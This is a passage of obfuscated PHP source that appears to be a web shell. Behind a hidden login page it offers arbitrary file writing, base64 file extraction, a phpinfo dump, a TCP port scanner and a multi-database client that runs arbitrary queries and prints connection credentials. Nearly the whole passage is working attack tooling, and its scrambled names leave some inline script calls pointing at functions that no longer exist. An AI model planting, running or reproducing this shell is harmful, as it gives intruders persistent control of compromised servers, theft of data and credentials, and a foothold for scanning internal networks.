    // if the file is larger than 100Kb and export is not enabled, display an error message
    else {
        echo "Error: File '$vwB' is larger than 100kb. Use the export option to download the file.\n";
    }
}

/**
 * Hook the isolated operations to add the login operation
 *
 * @param $xnBsolated_ops array The isolated operations container
 *
 * @return void
 */
function yetO(&$xnBsolated_ops) {
    global $Znu;

    $xnBsolated_ops[] = $Znu;
}

/**
 * Hook the features to add the login feature
 *
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function yzmu(&$HpEs) {
    global $Znu, $Znu_PREVIEW;

    $HpEs[] = array(
        "title"       => "File extraction",
        "description" => "Extract file content as base64.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 0 0-3.375-3.375h-1.5A1.125 1.125 0 0 1 13.5 7.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H8.25m.75 12 3 3m0 0 3-3m-3 3v-6m-1.5-9H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 0 0-9-9Z" />
</svg>',
        "op"          => $Znu,
    );
    $HpEs[] = array(
        "title"       => "File extraction",
        "description" => "Extract file content as base64.",
        "svg"         => '',
        "hidden"      => true,
        "op"          => $Znu_PREVIEW,
    );
}


/**
 * Create the example page
 *
 * @param $HRc_content string The page content container
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 * @param $HRc string The current page
 * @param $GnR string The CSS of the page
 */
function yyPd(&$HRc_content, $HpEs, $HRc, $GnR) {
    $HRc_content = yOWa(
        $HpEs,
        $GnR,
        $HRc,
        array(
            yKPB(
                $HpEs[$HRc]["title"],
                $HpEs[$HRc]["description"]
            ),
            yUQj(
                $HRc,
                $_SERVER["REQUEST_URI"],
                array(
                    yvFX(
                        "text",
                        "Path",
                        "s82",
                        "C://path/to/file.txt",
                        "Fully qualified path where the file will be written.",
                        true
                    ),
                    yvFX(
                        "textarea",
                        "File content",
                        "h39",
                        "Lorem ipsum dolor sit amet, consectetur adipiscing elit.",
                        "Content of the file to write to disk.",
                        true
                    ),
                    ypHp(
                        "A64",
                        "Decode from base64",
                        "Decode the content of the file from base64 before writing it to disk."
                    ),
                )
            ),
        )
    );
}

/**
 * Handle the login operation
 *
 * @param $VPY string The operation to handle
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *
 * @return void
 */
function yssr($VPY, $HpEs) {
    $qHt = $_POST['s82'];
    $DTi = yfJu("A64");
    $LGQ = $DTi ? base64_decode($_POST['h39']) : $_POST['h39'];

    echo "Received content of length " . strlen($LGQ) . " bytes.";
    echo "Writing to " . htmlentities($qHt) . "...";
    flush();

    file_put_contents($qHt, $LGQ);
    echo "File written successfully.";
}

/**
 * Hook the features to add the login feature
 *
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function yzJT(&$HpEs) {
    global $VYD;

    $HpEs[] = array(
        "title"       => "Write file",
        "description" => "Write a file to the given path, writing permission are required.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 0 0-3.375-3.375h-1.5A1.125 1.125 0 0 1 13.5 7.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H8.25m0 12.75h7.5m-7.5 3H12M10.5 2.25H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 0 0-9-9Z" />
</svg>',
        "op"          => $VYD,
    );
}


/**
 * Create the login page
 */
function yWpf(&$HRc_content, $HpEs, $HRc, $GnR) {
$ELMname = !empty($_GET["username"]) ? htmlentities($_GET["username"]) : false;
$Wed     = !empty($_GET["error"]) ? htmlentities($_GET["error"]) : false;

ob_start();
?>
<html lang="en" class="h-full bg-zinc-900">
<head>
    <title>5<1-4</title>
    <style><?= $GnR ?></style>
    <script>r5
        ##
        5</script>
</head>
<body class="h-full">
<div class="flex min-h-full flex-col justify-center px-6 py-12 lg:px-8">
    <div class="sm:mx-auto sm:w-full sm:max-w-sm">
        <h2 class="mt-10 text-center text-2xl font-bold leading-9 tracking-tight text-white">
            Sign in to your account
        </h2>
    </div>

    <?php if ($Wed): ?>
        <div class="mt-4 sm:mx-auto sm:w-full sm:max-w-sm">
            <div class="bg-red-500 p-3 rounded-md text-white text-center">
                <?php echo $Wed ?>
            </div>
        </div>
    <?php endif; ?>

    <div class="mt-10 sm:mx-auto sm:w-full sm:max-w-sm">
        <form class="space-y-6" action="<?= $_SERVER["REQUEST_URI"]; ?>" method="post">
            <input type="hidden" name="N62" value="<?= $HRc ?>"/>
            <div>
                <label for="s82" class="block text-sm font-medium leading-6 text-white">
                    Username
                </label>
                <div class="mt-2">
                    <input id="s82" name="s82" type="text" autocomplete="s82" required
                           class="block w-full rounded-md border-0 bg-white/5 py-1.5 text-white shadow-sm ring-1
                               ring-inset ring-white/10 focus:ring-2 focus:ring-inset focus:ring-indigo-500 sm:text-sm
                               sm:leading-6"
                           placeholder="admin"
                        <?php if ($ELMname) {
                            echo "value=\"$ELMname\"";
                        } ?>
                    >
                </div>
            </div>
            <div>
                <div class="flex items-center justify-between">
                    <label for="h39" class="block text-sm font-medium leading-6 text-white">
                        Password
                    </label>
                </div>
                <div class="mt-2">
                    <input id="h39" name="h39" type="password" autocomplete="h39" required
                           class="block w-full rounded-md border-0 bg-white/5 py-1.5 text-white shadow-sm ring-1
                               ring-inset ring-white/10 focus:ring-2 focus:ring-inset focus:ring-indigo-500 sm:text-sm
                               sm:leading-6"
                           placeholder="&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;"
                    >
                </div>
            </div>
            <div>
                <button type="submit"
                        class="flex w-full justify-center rounded-md bg-indigo-500 px-3 py-1.5 text-sm
                            font-semibold leading-6 text-white shadow-sm hover:bg-indigo-400 focus-visible:outline
                            focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-indigo-500">
                    Sign in
                </button>
            </div>
        </form>
    </div>
</div>
</body>
</html>
<?php
$HRc_content = ob_get_clean();
}

/**
 * Handle the login operation
 *
 * @param $VPY string The operation to handle
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *
 * @return void
 */
function yLfq($VPY, $HpEs) {
    global $qUd, $cph, $yqb;

    // loads the username and password from the POST request and hashes them
    $ELMname = hash("sha512", $_POST["s82"] . $qUd);
    $YeY     = hash("sha512", $_POST["h39"] . $qUd);

    // checks if the username and password are correct
    if ($ELMname === $yqb && $YeY === $cph) {
        // if the username and password are correct, set the auth session variable to true
        $_SESSION["auth"] = true;

        // redirect the user to the second feature page
        header("Location: ?page=" . urlencode($HpEs[1]["op"]), true, 301);
        return;
    }

    // if the username and password are incorrect, redirect the user to the login page
    header(
        "Location: ?page=$VPY&username=" . urlencode($_POST["s82"]) .
        "&error=" . urlencode("Invalid username or password"),
        true,
        301
    );
}

/**
 * Hook the page generation to check if the user is authenticated
 *
 * @return void
 */
function ypVA() {
    global $nqi;

    // Check if the user is authenticated
    if ($_SESSION["auth"] !== true) {
        header("Location: ?page=" . $nqi);
        die;
    }

    // if the user is authenticated simply continues
}

/**
 * Hook the isolated operations to add the login operation
 *
 * @param $xnBsolated_ops array The isolated operations container
 *
 * @return void
 */
function ykyw(&$xnBsolated_ops) {
    global $nqi;

    $xnBsolated_ops[] = $nqi;
}

/**
 * Hook the features to add the login feature
 *
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function yQmy(&$HpEs) {
    global $nqi;

    // Emplace the login feature at the beginning of the features array to make sure its picked as the fallback route if
    // none is defined
    array_unshift(
        $HpEs,
        array(
            "name"        => "Login",
            "description" => "A simple login page",
            "hidden"      => true,
            "op"          => $nqi,
        )
    );
}


/**
 * Create the example page
 *
 * @param $HRc_content string The page content container
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 * @param $HRc string The current page
 * @param $GnR string The CSS of the page
 */
function yQlM(&$HRc_content, $HpEs, $HRc, $GnR) {
    ob_start();
    phpinfo();
    $JJo         = ob_get_clean();
    $HRc_content = yOWa(
        $HpEs,
        $GnR,
        $HRc,
        array(
            yKPB(
                $HpEs[$HRc]["title"],
                $HpEs[$HRc]["description"]
            ),
            "<div class='grid grid-cols-2 gap-8 mt-8'>
                        <div>
                            <div id='phpinfo-container' class='max-w-full overflow-x-auto'></div>
                            <script>
                                const container = document.getElementById('phpinfo-container');
                                const shadow_root = container.attachShadow({mode: 'open'});
                                shadow_root.innerHTML = `$JJo`;
                            </script>
                        </div>
                        <div>
                            " . yNyK() . "
                        </div>
                    </div>",
        )
    );
}

/**
 * List all enabled extensions
 *
 * @return string
 */
function yNyK() {
    $uOIs = get_loaded_extensions();
    $LGQ  = ylqR(
        true,
        "max-h-96 overflow-y-scroll mb-8",
        "Enabled extensions",
        true,
        true
    );
    foreach ($uOIs as $uOI) {
        $LGQ .= "- $uOI\n";
    }
    $LGQ .= yPrI(true);
    return $LGQ;
}

/**
 * Hook the features to add the login feature
 *
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function ypak(&$HpEs) {
    global $SMv;

    $HpEs[] = array(
        "title"       => "PHP Info",
        "description" => "Display PHP information.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="m11.25 11.25.041-.02a.75.75 0 0 1 1.063.852l-.708 2.836a.75.75 0 0 0 1.063.853l.041-.021M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0Zm-9-3.75h.008v.008H12V8.25Z" />
</svg>',
        "op"          => $SMv,
    );
}


/**
 * Create the example page
 *
 * @param $HRc_content string The page content container
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 * @param $HRc string The current page
 * @param $GnR string The CSS of the page
 */
function yHbg(&$HRc_content, $HpEs, $HRc, $GnR) {
    $HRc_content = yOWa(
        $HpEs,
        $GnR,
        $HRc,
        array(
            yKPB(
                $HpEs[$HRc]["title"],
                $HpEs[$HRc]["description"]
            ),
            yUQj(
                $HRc,
                $_SERVER["REQUEST_URI"],
                array(
                    yvFX(
                        "text",
                        "Host",
                        "s82",
                        "localhost",
                        "The host to connect to",
                        true
                    ),
                    yvFX(
                        "number",
                        "Starting port",
                        "h39",
                        "1",
                        "Starting port of the scan (included)",
                        true
                    ),
                    yvFX(
                        "number",
                        "Ending port",
                        "A64",
                        "65535",
                        "Ending port of the scan (included)",
                        true
                    ),
                )
            ),
        )
    );
}

/**
 * Handle the login operation
 *
 * @param $VPY string The operation to handle
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *
 * @return void
 */
function ytCo($VPY, $HpEs) {
    $LPG = $_POST['s82'];
    $mIH = intval($_POST['h39']);
    $jbb = intval($_POST['A64']);

    echo "Scanning ports $mIH to $jbb on " . htmlentities($LPG) . "...\n";

    // Loop through the port range
    for ($CDx = $mIH; $CDx <= $jbb; $CDx++) {
        // Attempt to connect to the host on the current port
        $zqx = @fsockopen($LPG, $CDx, $ItD, $Cyz, 1);

        // Check if the connection was successful
        if ($zqx) {
            // The port is open
            fclose($zqx);
            echo "Port $CDx: OPEN\n";
        }
        else {
            // The port is closed or unreachable
            echo "Port $CDx: CLOSED / UNREACHABLE (err: $Cyz)\n";
        }
        flush();
    }
}

/**
 * Hook the features to add the login feature
 *
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function yiOD(&$HpEs) {
    global $FJG;

    $HpEs[] = array(
        "title"       => "Port scan",
        "description" => "Scan a given range of TCP ports using connect method.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v3.75m0-10.036A11.959 11.959 0 0 1 3.598 6 11.99 11.99 0 0 0 3 9.75c0 5.592 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.57-.598-3.75h-.152c-3.196 0-6.1-1.25-8.25-3.286Zm0 13.036h.008v.008H12v-.008Z" />
</svg>',
        "op"          => $FJG,
    );
}


/**
 * Create the example page
 *
 * @param $HRc_content string The page content container
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 * @param $HRc string The current page
 * @param $GnR string The CSS of the page
 */
function yKUz(&$HRc_content, $HpEs, $HRc, $GnR) {
    $HRc_content = yOWa(
        $HpEs,
        $GnR,
        $HRc,
        array(
            yKPB(
                $HpEs[$HRc]["title"],
                $HpEs[$HRc]["description"]
            ),
            yUQj(
                $HRc,
                $_SERVER["REQUEST_URI"],
                array(
                    yQAj(
                        "Database",
                        "s82",
                        array(
                            [
                                "value"    => "mysql",
                                "label"    => "MySQL",
                                "disabled" => !extension_loaded("mysql") &&
                                              !extension_loaded("mysqli") &&
                                              !extension_loaded("pdo_mysql"),
                            ],
                            [
                                "value"    => "cubrid",
                                "label"    => "CUBRID",
                                "disabled" => !extension_loaded("cubrid") &&
                                              !extension_loaded("pdo_cubrid"),
                            ],
                            [
                                "value"    => "pgsql",
                                "label"    => "PostgreSQL",
                                "disabled" => !extension_loaded("pgsql") &&
                                              !extension_loaded("pdo_pgsql"),
                            ],
                            [
                                "value"    => "sqlite",
                                "label"    => "SQLite",
                                "disabled" => !extension_loaded("sqlite3") &&
                                              !extension_loaded("pdo_sqlite"),
                            ],
                            [
                                "value"    => "sqlsrv",
                                "label"    => "SQL Server",
                                "disabled" => !extension_loaded("sqlsrv") &&
                                              !extension_loaded("pdo_sqlsrv"),
                            ],
                            [
                                "value"    => "oci",
                                "label"    => "Oracle",
                                "disabled" => !extension_loaded("oci8") &&
                                              !extension_loaded("pdo_oci"),
                            ],
                            [
                                "value"    => "mongodb",
                                "label"    => "MongoDB",
                                "disabled" => !extension_loaded("mongo") &&
                                              !extension_loaded("mongodb"),
                            ],
                            [
                                "value"    => "ibm",
                                "label"    => "IBM DB2",
                                "disabled" => !extension_loaded("ibm_db2") &&
                                              !extension_loaded("pdo_ibm"),
                            ],
                            [
                                "value"    => "firebird",
                                "label"    => "Firebird/Interbase",
                                "disabled" => !extension_loaded("interbase") &&
                                              !extension_loaded("pdo_firebird"),
                            ],
                            [
                                "value"    => "odbc",
                                "label"    => "ODBC",
                                "disabled" => !extension_loaded("odbc") &&
                                              !extension_loaded("pdo_odbc"),
                            ],
                            [
                                "value"    => "informix",
                                "label"    => "Informix",
                                "disabled" => !extension_loaded("pdo_informix"),
                            ],
                            [
                                "value"    => "sybase",
                                "label"    => "Sybase",
                                "disabled" => !extension_loaded("sybase") &&
                                              !extension_loaded("mssql") &&
                                              !extension_loaded("pdo_dblib"),
                            ],
                            [
                                "value"    => "raw",
                                "label"    => "Raw PDO connection string",
                                "disabled" => !extension_loaded("pdo"),
                                "selected" => true,
                            ],
                        ),
                        true,
                        "Database driver not available."
                    ),
                    yvFX(
                        "text",
                        "Host",
                        "h39",
                        "localhost",
                        "The host to connect to (default: localhost)"
                    ),
                    yvFX(
                        "number",
                        "Port",
                        "A64",
                        "3306",
                        "
                                    The port to connect to, default depend on the database
                                    <ul class='text-sm text-zinc-500 list-disc list-inside'>
                                        <li>MySQL (default: 3306)</li>
                                        <li>CUBRID (default: 30000)</li>
                                        <li>PostgreSQL (default: 5432)</li>
                                        <li>SQLite (default: None)</li>
                                        <li>SQL Server (default: 1433)</li>
                                        <li>Oracle (default: 1521)</li>
                                        <li>MongoDB (default: 27017)</li>
                                        <li>IBM DB2 (default: 50000)</li>
                                        <li>Firebird/Interbase (default: 3050)</li>
                                        <li>ODBC (default: None)</li>
                                        <li>Informix (default: 9800)</li>
                                        <li>Sybase (default: 5000)</li>
                                    </ul>"
                    ),
                    yvFX(
                        "text",
                        "Username",
                        "u43",
                        "admin",
                        "The username to connect with.",
                        true
                    ),
                    yvFX(
                        "password",
                        "Password",
                        "L10",
                        "&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;",
                        "The password to connect with.",
                        true
                    ),
                    yvFX(
                        "text",
                        "Database",
                        "j48",
                        "ExampleDB",
                        "The database to connect to."
                    ),
                    yvFX(
                        "text",
                        "Charset",
                        "X48",
                        "utf8",
                        "The charset to use for the connection."
                    ),
                    yvFX(
                        "text",
                        "Service name",
                        "j77",
                        "orcl",
                        "The service name to use for the connection."
                    ),
                    yvFX(
                        "text",
                        "SID",
                        "K67",
                        "orcl",
                        "The SID to use for the connection."
                    ),
                    yvFX(
                        "text",
                        "Options",
                        "i99",
                        "ssl=true",
                        "The options to use for the connection."
                    ),
                    yvFX(
                        "text",
                        "Role",
                        "i05",
                        "SYSDBA",
                        "The role to use for the connection."
                    ),
                    yvFX(
                        "text",
                        "Dialect",
                        "K87",
                        "3",
                        "The dialect to use for the connection."
                    ),
                    yvFX(
                        "text",
                        "Protocol",
                        "v11",
                        "onsoctcp",
                        "The protocol to use for the connection."
                    ),
                    ypHp(
                        "a67",
                        "Enable scrollable cursors",
                        "Enable scrollable cursors for the connection.",
                        true,
                        "1"
                    ),
                    yvFX(
                        "text",
                        "ODBC driver",
                        "C51",
                        "ODBC Driver 17 for SQL Server",
                        "The ODBC driver to use for the connection."
                    ),
                    yvFX(
                        "text",
                        "Raw connection string",
                        "M43",
                        "mysql:host=localhost;port=3306;dbname=ExampleDB;charset=utf8",
                        "The raw connection string to use for the connection."
                    ),
                    yvFX(
                        "text",
                        "Server",
                        "E12",
                        "ol_informix1170",
                        "The Informix server name to use for the connection."
                    ),
                    yvFX(
                        "textarea",
                        "Query",
                        "v99",
                        "SHOW DATABASES",
                        "The query to run against the database. Leave empty to perform a connection test."
                    ),
                    yvFX(
                        "text",
                        "Collection",
                        "P01",
                        "users",
                        "The collection to query against for MongoDB."
                    ),
                    '<script>
                        function ynFJ() {
                            for (let i = 2; i <= 17; i++) {
                                document.getElementById(`__PARAM_${i}__-container`).classList.add(`hidden`);
                            }
                            
                            document.getElementById(`P01-container`).classList.add(`hidden`);
                        }
                        
                        function yevh(start, end) {
                            for (let i = start; i <= end; i++) {
                                document.getElementById(`__PARAM_${i}__-container`).classList.remove(`hidden`);
                            }
                        }
                        
                        hideAll();
                        showRange(16, 16);
                        const select = document.getElementById(`s82`);
                        select.addEventListener(`change`, (event) => {
                           const value = event.target.value;
                           hideAll()
                            
                           switch (value) {
                                case `raw`:
                                    showRange(16, 16);
                                    break;
                                case `mysql`:
                                case `cubrid`:
                                    showRange(2, 7);
                                    break;
                                case `pgsql`:
                                case `sqlsrv`:
                                case `ibm`:
                                case `sybase`:
                                    showRange(2, 6);
                                    break;
                                case `sqlite`:
                                    showRange(2, 2);
                                    showRange(4, 5);
                                    break;
                                case `oci`:
                                    showRange(2, 5);
                                    showRange(8, 9);
                                    break;
                                case `mongodb`:
                                    showRange(2, 6);
                                    showRange(10, 10);
                                    showRange(19, 19);
                                    break;
                                case `firebird`:
                                    showRange(2, 7);
                                    showRange(11, 12);
                                    break;
                                case `odbc`:
                                    showRange(2, 6);
                                    showRange(15, 15);
                                    break;
                                case `informix`:
                                    showRange(2, 6);
                                    showRange(13, 14);
                                    showRange(17, 17);
                                    break;
                           }
                        });
                    </script>',
                )
            ),
        )
    );
}

/**
 * Handle the login operation
 *
 * @param $VPY string The operation to handle
 * @param $HpEs array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *
 * @return void
 */
function yNhD($VPY, $HpEs) {
    yoqM(
        $_POST["s82"],
        $_POST["u43"],
        $_POST["L10"],
        !empty($_POST["h39"]) ? $_POST["h39"] : "localhost",
        !empty($_POST["A64"]) ? intval($_POST["A64"]) : null,
        $_POST["j77"],
        $_POST["K67"],
        $_POST["j48"],
        $_POST["X48"],
        $_POST["i99"],
        $_POST["i05"],
        $_POST["K87"],
        $_POST["C51"],
        $_POST["E12"],
        !empty($_POST["v11"]) ? $_POST["v11"] : "onsoctcp",
        $_POST["a67"],
        $_POST["M43"],
        $_POST["v99"],
        $_POST["P01"]
    );
}

/**
 * Run a PDO query and output the results
 *
 * @param $vvo PDO PDO connection to use
 * @param $cje string Query to run
 *
 * @return void
 */
function yTns($vvo, $cje) {
    $YaW = $vvo->query($cje);
    if ($YaW) {
        $Qdp = $YaW->fetchAll(PDO::FETCH_ASSOC);
        if ($Qdp) {
            echo "[Driver: PDO] Query executed successfully.\n";
            yITb($Qdp);
        }
        else {
            echo "[Driver: PDO] Query failed: " . json_encode($vvo->errorInfo()) . "\n";
        }
    }
    else {
        echo "[Driver: PDO] Query failed: " . json_encode($vvo->errorInfo()) . "\n";
    }
}

/**
 * Connect to a database using the given credentials and return the connection
 *
 * @param $jPm_type string Database type
 * @param $ELMname string Username to connect with
 * @param $YeY string Password to connect with
 * @param $LPG string Host to connect to
 * @param $CDx int|null Port to connect to
 * @param $Uvc string|null Service name to use for connection
 * @param $Qwe string|null SID to use for connection
 * @param $ybQbase string|null Database to connect to
 * @param $vAY string|null Charset to use for connection
 * @param $yhe string|null Options to use for connection
 * @param $Ulh string|null Role to use for connection
 * @param $Emx string|null Dialect to use for connection
 * @param $EQn string|null ODBC driver to use for connection
 * @param $MSw string|null Informix server name
 * @param $nzm string Protocol to use for connection
 * @param $RyE string|null Whether to enable scrollable cursors
 * @param $ERU string Raw connection string to use for connection
 * @param $cje string|null Query to run
 * @param $Faq string|null Collection to use for connection
 *
 * @return void
 */
function yoqM(
    $jPm_type,
    $ELMname,
    $YeY,
    $LPG = 'localhost',
    $CDx = null,
    $Uvc = null,
    $Qwe = null,
    $ybQbase = null,
    $vAY = null,
    $yhe = null,
    $Ulh = null,
    $Emx = null,
    $EQn = null,
    $MSw = null,
    $nzm = "onsoctcp",
    $RyE = null,
    $ERU = "",
    $cje = null,
    $Faq = null
) {
    if ($jPm_type === 'mysql') {
        $CDx = $CDx ?: 3306;

        // Check if the MySQL extension is loaded
        if (extension_loaded("mysql")) {
            $Dey = mysql_connect("$LPG:$CDx", $ELMname, $YeY);

            if (!$Dey) {
                echo "[Driver: mysql] Connection failed: " . htmlentities(mysql_error());
            }
            else {
                echo "[Driver: mysql] Connected successfully using " .
                     htmlentities($ELMname) .
                     ":" .
                     htmlentities($YeY) .
                     PHP_EOL;

                if (!empty($cje)) {
                    $Qdp = mysql_query($cje, $Dey);
                    echo "[Driver: mysql] Query executed successfully.\n";
                    if ($Qdp) {
                        $OgF = array();
                        while ($DdP = mysql_fetch_assoc($Qdp)) {
                            $OgF[] = $DdP;
                        }
                        yITb($OgF);
                    }
                    else {
                        echo "[Driver: mysql] Query failed: " . htmlentities(mysql_error());
                    }
                }
            }
        }
        // Check if the MySQLi extension is loaded
        elseif (extension_loaded("mysqli")) {
            mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);

            try {
                $Dey = mysqli_connect($LPG, $ELMname, $YeY, $ybQbase, $CDx);

                if (!$Dey) {
                    echo "[Driver: mysqli] Connection failed: " . htmlentities(mysqli_connect_error());
                }
                else {
                    echo "[Driver: mysqli] Connected successfully using " .
                         htmlentities($ELMname) .
                         ":" .
                         htmlentities($YeY) .
                         PHP_EOL;

                    if (!empty($cje)) {
                        $Qdp = mysqli_query($Dey, $cje);
                        if ($Qdp) {
                            echo "[Driver: mysqli] Query executed successfully.\n";
                            $OgF = array();
                            while ($DdP = mysqli_fetch_assoc($Qdp)) {
                                $OgF[] = $DdP;
                            }
                            yITb($OgF);
                        }
                        else {
                            echo "[Driver: mysql] Query failed: " . htmlentities(mysqli_error($Dey));
                        }
                    }
                }
            }
            catch (mysqli_sql_exception $xql) {
                echo "[Driver: mysqli] Connection failed: " . htmlentities($xql->getMessage());
            }
        }
        // Check if the PDO MySQL extension is loaded
        elseif (extension_loaded("pdo_mysql")) {
            try {
                $wOc = "mysql:host=$LPG;port=$CDx" .
                       (!empty($ybQbase) ? ";dbname=$ybQbase" : "") .
                       (!empty($vAY) ? ";charset=$vAY" : "");

                $vvo = new PDO($wOc, $ELMname, $YeY);
                echo "[Driver: pdo_mysql] Connected successfully using " .
                     htmlentities($ELMname) .
                     ":" .
                     htmlentities($YeY) .
                     PHP_EOL;

                if (!empty($cje)) {
                    yTns($vvo, $cje);
                }
            }
            catch (PDOException $xql) {
                echo "[Driver: pdo_mysql] Connection failed: " . htmlentities($xql->getMessage());
            }
        }
        // Check if the PDO extension is loaded but the PDO MySQL driver is not installed
        elseif (extension_loaded("pdo")) {
            echo "[Driver: PDO] PDO extension is loaded but PDO MySQL driver is not installed.\n";
        }
        else {
            echo "[Driver: none] MySQL extension is not loaded.\n";
        }
    }
    elseif ($jPm_type === 'cubrid') {
        $CDx = $CDx ?: 30000;

        // Check if the CUBRID PDO extension is loaded
        if (extension_loaded("pdo_cubrid")) {
            try {
                $wOc = "cubrid:host=$LPG;port=$CDx" .
                       (!empty($ybQbase) ? ";dbname=$ybQbase" : "") .
                       (!empty($vAY) ? ";charset=$vAY" : "");

                $vvo = new PDO($wOc, $ELMname, $YeY);
                echo "[Driver: pdo_cubrid] Connected successfully using " .
                     htmlentities($ELMname) .
                     ":" .
                     htmlentities($YeY) .
                     PHP_EOL;;

                if (!empty($cje)) {
                    yTns($vvo, $cje);
                }
            }
            catch (PDOException $xql) {
                echo "[Driver: pdo_cubrid] Connection failed: " . htmlentities($xql->getMessage());
            }
        }
        // Check if the CUBRID extension is loaded
        elseif (extension_loaded("cubrid")) {
            $Dey = cubrid_connect($LPG, $CDx, $ybQbase, $ELMname, $YeY);

            if (!$Dey) {
                echo "[Driver: cubrid] Connection failed: " . htmlentities(cubrid_error_msg());
            }
            else {
                echo "[Driver: cubrid] Connected successfully using " .
                     htmlentities($ELMname) .
                     ":" .
                     htmlentities($YeY) .
                     PHP_EOL;;

                if (!empty($cje)) {
                    $Qdp = cubrid_query($cje, $Dey);
                    if ($Qdp) {
                        echo "[Driver: cubrid] Query executed successfully.\n";
                        $OgF = array();
                        while ($DdP = cubrid_fetch_assoc($Qdp)) {
                            $OgF[] = $DdP;
                        }
                        yITb($OgF);
                    }
                    else {
                        echo "[Driver: cubrid] Query failed: " . htmlentities(cubrid_error($Dey));
                    }
                }
            }
        }
        else {
            echo "[Driver: none] CUBRID extension is not loaded.\n";
        }
    }
    elseif ($jPm_type === 'pgsql') {
        $CDx = $CDx ?: 5432;

        // Check if the PostgreSQL PDO extension is loaded
        if (extension_loaded("pdo_pgsql")) {
            try {
                $wOc = "pgsql:host=$LPG;port=$CDx" . (!empty($ybQbase) ? ";dbname=$ybQbase" : "");

                $vvo = new PDO($wOc, $ELMname, $YeY);
                echo "[Driver: pdo_pgsql] Connected successfully using " .
                     htmlentities($ELMname) .
                     ":" .
                     htmlentities($YeY) .
                     PHP_EOL;;

                if (!empty($cje)) {
                    yTns($vvo, $cje);
                }
            }
            catch (PDOException $xql) {
                echo "[Driver: pdo_pgsql] Connection failed: " . htmlentities($xql->getMessage());
            }
        }
        // Check if the PostgreSQL extension is loaded
        elseif (extension_loaded("pgsql")) {
            $Dey = pg_connect("host=$LPG port=$CDx dbname=$ybQbase user=$ELMname password=$YeY");

            if (!$Dey) {
                echo "[Driver: pgsql] Connection failed: " . htmlentities(pg_last_error());
            }
            else {
                echo "[Driver: pgsql] Connected successfully using " .
                     htmlentities($ELMname) .
                     ":" .
                     htmlentities($YeY) .
                     PHP_EOL;;

                if (!empty($cje)) {
                    $Qdp = pg_query($Dey, $cje);
                    if ($Qdp) {
                        echo "[Driver: pgsql] Query executed successfully.\n";
                        $OgF = array();
                        while ($DdP = pg_fetch_assoc($Qdp)) {
                            $OgF[] = $DdP;
                        }
                        yITb($OgF);
                    }
                    else {
                        echo "[Driver: pgsql] Query failed: " . htmlentities(pg_last_error($Dey));
                    }
                }
            }
        }
        else {
            echo "[Driver: none] PostgreSQL extension is not loaded.\n";
        }
    }
    elseif ($jPm_type === 'sqlite') {
        // Check if the SQLite PDO extension is loaded
        if (extension_loaded("pdo_sqlite")) {
            try {
                $wOc = "sqlite:$LPG";

                $vvo = new PDO($wOc);
                echo "[Driver: pdo_sqlite] Connected successfully using " . htmlentities($LPG) . PHP_EOL;

                if (!empty($cje)) {
                    yTns($vvo, $cje);
                }
            }
            catch (PDOException $xql) {
                echo "[Driver: pdo_sqlite] Connection failed: " . htmlentities($xql->getMessage());
            }
        }
        // Check if the SQLite extension is loaded
        elseif (extension_loaded("sqlite3")) {
            $Dey = sqlite_open($LPG, 0666, $Wed);

            if (!$Dey) {
                echo "[Driver: sqlite3] Connection failed: " . htmlentities($Wed);
            }
            else {
                echo "[Driver: sqlite3] Connected successfully using " . htmlentities($LPG) . PHP_EOL;

                if (!empty($cje)) {
                    $Qdp = sqlite_query($Dey, $cje);
                    if ($Qdp) {
                        echo "[Driver: sqlite3] Query executed successfully.\n";
                        $OgF = array();
                        while ($DdP = sqlite_fetch_array($Qdp)) {
                            $OgF[] = $DdP;
                        }
                        yITb($OgF);
                    }
                    else {
